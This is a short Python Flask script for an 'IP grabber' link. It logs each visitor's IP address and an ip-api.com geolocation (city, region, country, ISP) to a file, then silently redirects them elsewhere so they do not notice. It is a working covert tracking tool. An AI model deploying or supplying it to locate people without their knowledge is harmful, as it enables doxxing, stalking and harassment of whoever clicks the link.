from flask import Flask, request, redirect
import datetime, requests

app = Flask(__name__)

REDIRECT_URL = "https://example.com"  # change this to wherever you want visitors sent

def get_geo_info(ip):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        if response.status_code == 200:
            data = response.json()
            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')} | ISP: {data.get('isp')}"
        else:
            return "Geo lookup failed"
    except Exception as e:
        return f"Error: {e}"

@app.route("/")
def log_ip():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    geo_info = get_geo_info(ip) if not ip.startswith(("192.168", "10.", "172.")) else "Local network IP"

    with open("ip_log.txt", "a") as f:
        f.write(f"{datetime.datetime.now()} - {ip} - {geo_info}\n")

    return redirect(REDIRECT_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
